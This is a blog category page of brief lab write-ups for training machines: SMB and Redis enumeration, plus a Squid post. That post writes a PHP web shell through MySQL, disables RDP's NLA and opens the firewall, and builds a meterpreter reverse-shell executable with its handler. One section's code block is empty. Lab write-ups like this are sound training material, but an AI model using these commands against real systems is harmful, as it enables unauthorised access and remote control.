@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Sphinx | articles in the "HTB" category</title>
+    <link rel="shortcut icon" type="image/png" href="https://sfinx.kozow.com/favicon.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://sfinx.kozow.com/favicon.ico">
+    <link href="https://sfinx.kozow.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Sphinx Full Atom Feed" />
+    <link href="https://sfinx.kozow.com/feeds/htb.atom.xml" type="application/atom+xml" rel="alternate" title="Sphinx Categories Atom Feed" />
+    <link rel="stylesheet" href="https://sfinx.kozow.com/theme/css/main.css" type="text/css" />
+    <link rel="stylesheet" href="https://sfinx.kozow.com/theme/css/pygments.css" type="text/css" />
+    <meta name="generator" content="Pelican" />
+    <meta name="description" content="Ghost Shell, lurking throughs the realm of electronic device, find a way to break in while you being the watcher of my work. follow me alonng the journey, To the Abyss." />
+    <meta name="author" content="MedSecure" />
+</head>
+<body>
+    <header>
+        <nav style="overflow: hidden;">
+            <ul>
+
+                <li class="ephemeral selected"><a href="https://sfinx.kozow.com/category/htb.html">HTB</a></li>
+                <li><a href="https://sfinx.kozow.com/">Home</a></li>
+                <li><a href="https://github.com/Medaz-Sploit">GitHub</a></li>
+                <li><a href="https://sfinx.kozow.com/{date:%Y}/{date:%-m}/{date:%-d}/{slug}/">PortSwigger</a></li>
+                <li><a href="https://sfinx.kozow.com/categories">Categories</a></li>
+            </ul>
+        </nav>
+        <div class="header_box" style="height: 50px">
+        <h1><a href="https://sfinx.kozow.com/">
+            <image src='' class="avatar" width="50px" /><span class="site_title">Sphinx</span>
+            </a></h1></div>
+        </div>
+    </header>
+    <div id="wrapper">
+        <div id="content">            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/dancing/" rel="bookmark" title="Permanent Link to &quot;Dancing Machine&quot;">Dancing Machine</a>
+                </h2>
+
+                
+                
+
+                <h1>Dancing Machine</h1>
+<h1>HTB/STARTING_POINT</h1>
+<p>In this machine we learn to enumerate SMB file shares.</p>
+<h3>To list shares</h3>
+<div class="highlight"><pre><span></span><code>kali@kali:~$<span class="w"> </span>smbclient<span class="w"> </span>-L<span class="w"> </span>//&lt;serverIP/name&gt;<span class="w"> </span>-N
+</code></pre></div>
+
+<h3>To download all file to a backup file become handing when u have a large file system</h3>
+<div class="highlight"><pre><span></span><code>kali@kali:~$<span class="w"> </span>smbclient<span class="w"> </span>//&lt;serverIP/name&gt;/&lt;shareDisk&gt;<span class="w"> </span>-N<span class="w"> </span>-Tc<span class="w"> </span>backup.tar
+</code></pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/dancing/">posted at 19:10</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/htb.html" rel="tag">HTB</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/explosion/" rel="bookmark" title="Permanent Link to &quot;Explosion Machine&quot;">Explosion Machine</a>
+                </h2>
+
+                
+                
+
+                <h1>Explosion</h1>
+<h1>HTB/STARTING_POINT</h1>
+<p>This machine teach you how to interact with RDP protocol and enumerate it .</p>
+<p>Let’s start by map to scan all open ports, since this machine is focused on RDP , we will reduce time by specifying the port on 3389 ;</p>
+<div class="highlight"><pre><span></span><code>
+</code></pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/explosion/">posted at 19:10</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/htb.html" rel="tag">HTB</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/redeemer/" rel="bookmark" title="Permanent Link to &quot;Redeemer Machine&quot;">Redeemer Machine</a>
+                </h2>
+
+                
+                
+
+                <h1>Redeemer</h1>
+<h1>HTB/STARTING_POINT</h1>
+<p>This machine show you how to interact with a Redis server .</p>
+<p>Doing Nmap scan show open port and specifically redid port open on :</p>
+<div class="highlight"><pre><span></span><code>kali@kali:~$<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-T4<span class="w"> </span>-p-<span class="w"> </span>-oA<span class="w"> </span>nmap/Redeemer<span class="w"> </span>&lt;serverIp&gt;
+</code></pre></div>
+
+<p>Result :</p>
+<div class="highlight"><pre><span></span><code><span class="gp"># </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span>scan<span class="w"> </span>initiated<span class="w"> </span>Thu<span class="w"> </span>Aug<span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">02</span>:07:23<span class="w"> </span><span class="m">2023</span><span class="w"> </span>as:<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-T4<span class="w"> </span>-p-<span class="w"> </span>-oA<span class="w"> </span>nmap/Redeemer<span class="w"> </span><span class="m">10</span>.129.6.102
+<span class="go">Warning: 10.129.6.102 giving up on port because retransmission cap hit (6).</span>
+<span class="go">Nmap scan report for 10.129.6.102</span>
+<span class="go">Host is up (0.11s latency).</span>
+<span class="go">Not shown: 65526 closed tcp ports (conn-refused)</span>
+<span class="go">PORT      STATE    SERVICE VERSION</span>
+<span class="go">6379/tcp  open     redis   Redis key-value store 5.0.7</span>
+<span class="go">23201/tcp filtered unknown</span>
+<span class="go">23819/tcp filtered unknown</span>
+<span class="go">25153/tcp filtered unknown</span>
+<span class="go">34008/tcp filtered unknown</span>
+<span class="go">35903/tcp filtered unknown</span>
+<span class="go">39049/tcp filtered unknown</span>
+<span class="go">40140/tcp filtered unknown</span>
+<span class="go">47535/tcp filtered unknown</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="gp"># </span>Nmap<span class="w"> </span><span class="k">done</span><span class="w"> </span>at<span class="w"> </span>Thu<span class="w"> </span>Aug<span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">02</span>:25:02<span class="w"> </span><span class="m">2023</span><span class="w"> </span>--<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1059</span>.07<span class="w"> </span>seconds
+</code></pre></div>
+
+<p>Connect to redis ;</p>
+<div class="highlight"><pre><span></span><code>kali@kali:~$<span class="w"> </span>redis-cli<span class="w"> </span>-h<span class="w"> </span>&lt;hostname/ip&gt;
+</code></pre></div>
+
+<p>Get all db ;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>config<span class="w"> </span>get<span class="w"> </span>databases
+</code></pre></div>
+
+<p>Get existed keys with correspond db index;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>info<span class="w"> </span>keyspace<span class="w"> </span>
+</code></pre></div>
+
+<p>Select desired db;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span><span class="k">select</span><span class="w"> </span>&lt;N&gt;
+</code></pre></div>
+
+<p>Get info on Redis server;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>info
+</code></pre></div>
+
+<p>Dump all keys;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>keys<span class="w"> </span>*
+</code></pre></div>
+
+<p>Get random keys;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>randomkey<span class="w"> </span>
+</code></pre></div>
+
+<p>Print specified key value;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>get<span class="w"> </span>&lt;keyname&gt;
+</code></pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/redeemer/">posted at 19:10</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/htb.html" rel="tag">HTB</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/squid/" rel="bookmark" title="Permanent Link to &quot;Squid Machine&quot;">Squid Machine</a>
+                </h2>
+
+                
+                
+
+                <h1>SQUID - MACHINE / PG</h1>
+<h1>PG/easy_windows</h1>
+<p>This machine a proxy named squid that proxy all network traffic from outside . It operate on port 3128</p>
+<h4>Mysql 3306:</h4>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="ss">&quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="ss">&quot;C:\\xampp\\htdocs\\backdoor.php&quot;</span>
+</code></pre></div>
+
+<h4>Disable NLA;</h4>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>add<span class="w"> </span><span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP&quot;</span><span class="w"> </span>/v<span class="w"> </span>UserAuthentication<span class="w"> </span>/t<span class="w"> </span>REG_DWORD<span class="w"> </span>/d<span class="w"> </span><span class="s2">&quot;0&quot;</span><span class="w"> </span>/f
+</code></pre></div>
+
+<h4>Enable RDP on owned machine:</h4>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>add<span class="w"> </span><span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span><span class="w"> </span>/v<span class="w"> </span>fDenyTSConnections<span class="w"> </span>/t<span class="w"> </span>REG_DWORD<span class="w"> </span>/d<span class="w"> </span><span class="m">0</span><span class="w"> </span>/f
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>netsh<span class="w"> </span>advfirewall<span class="w"> </span>firewall<span class="w"> </span><span class="nb">set</span><span class="w"> </span>rule<span class="w"> </span><span class="nv">group</span><span class="o">=</span><span class="s2">&quot;remote desktop&quot;</span><span class="w"> </span>new<span class="w"> </span><span class="nv">enable</span><span class="o">=</span>yes
+</code></pre></div>
+
+<h4>Reverse Shell with Meterpreter:</h4>
+<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.0.17<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>--format<span class="o">=</span>exe<span class="w"> </span>&gt;<span class="w"> </span>evil.exe
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>msf5&gt;<span class="w"> </span>use<span class="w"> </span>exploit/multi/handler
+msf5&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/meterpreter/reverse_tcp
+msf5&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.0.17
+msf5&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+msf5&gt;<span class="w"> </span>run
+</code></pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/squid/">posted at 19:10</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/htb.html" rel="tag">HTB</a>
+                </div>
+            </article>
+
+            <div class="clear"></div>
+            <footer>
+                <p>
+                <a href="https://github.com/tcarwash/blue-penguin-dark">Blue Penguin Dark</a> Theme
+                &middot;
+                Powered by <a href="http://getpelican.com">Pelican</a>
+                &middot;
+                <a href="https://sfinx.kozow.com/feeds/all.atom.xml" rel="alternate">Atom Feed</a>
+            </footer>
+        </div>
+        <div class="clear"></div>
+    </div>
+</body>
+</html>
